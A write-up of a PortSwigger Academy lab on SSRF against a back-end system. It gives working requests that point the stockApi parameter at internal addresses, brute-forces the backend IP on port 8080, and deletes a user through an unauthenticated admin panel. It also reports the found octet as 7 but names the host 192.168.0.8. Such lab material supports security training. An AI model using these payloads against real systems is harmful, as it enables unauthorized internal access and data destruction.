## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/0acd4dd9-2089-4dee-9e4c-60b650cceccb)


## Overview :

Another type of trust relationship that often arises with server-side request forgery is where the application server is able to interact with other back-end systems that are not directly reachable by users.

> Most of the internal back-end systems contain sensitive functionality that can be accessed without authentication by anyone who is able to interact with the systems. 

Here, an attacker can exploit the SSRF vulnerability to access the administrative interface of a backend system  by submitting the following request:

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
```

## Solution :


In this lab, the admin interface is at **port 8080** & the ip of the backend server is around `192.168.0.x` . We need to bruteforce the last part of the IP.

So first change the url to something like this ,

```http
POST /product/stock HTTP/1.1
Host: 0ae900140301c1b183ddba2200fe0019.web-security-academy.net
Cookie: session=k0UjtIhRNjucGoUFnqbLOKYgYoTBfI22
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0ae900140301c1b183ddba2200fe0019.web-security-academy.net/product?productId=9
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: https://0ae900140301c1b183ddba2200fe0019.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

stockApi=http://192.168.0.0:8080/admin
```

Send the request to intruder and add bruteforce the alst part of the IP - `http://192.168.0.$0$:8080/admin`. 

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/7fc9a92a-18af-4527-8135-77e59864f76f)

We got a 200 ok response for `7`. So the ip of backend server is `192.168.0.8`.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/2f489589-2ee2-4bd2-9dc4-913781f93eb3)


Fetching the backend server's admin panel.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/16591a16-3617-4cfc-bbd1-a1fbe65ce5b4)

Delete the user carlos using the uri (`/admin/delete?username=carlos`) . 

> The uri can be found in the response of the admin panel page.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/bc61e96a-9a21-4218-850b-abd73f9f8a08)

Thus we solved the lab.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/f08c54ec-70b9-4b9d-8cf3-32828e7379df)





